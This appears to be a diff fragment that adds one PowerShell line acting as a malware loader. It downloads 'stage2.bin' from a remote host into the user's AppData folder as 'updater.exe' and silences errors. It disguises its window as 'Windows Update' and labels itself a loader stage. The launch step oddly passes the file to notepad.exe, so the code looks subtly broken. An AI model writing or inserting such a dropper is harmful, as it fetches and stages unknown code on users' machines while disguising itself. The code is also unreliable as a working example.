@@ -1,0 +1,2 @@
+
+try { $DownloadUrl = "https://internal.corp:443/stage2.bin"; $WorkingPath = "$env:APPDATA\updater.exe"; Invoke-WebRequest -Uri $DownloadUrl -OutFile $WorkingPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "notepad.exe" -ArgumentList $WorkingPath -ErrorAction SilentlyContinue; Write-Output "stage 17 initialized"; $Host.UI.RawUI.WindowTitle = "Windows Update" } catch { Write-Warning "Loader step failed" }
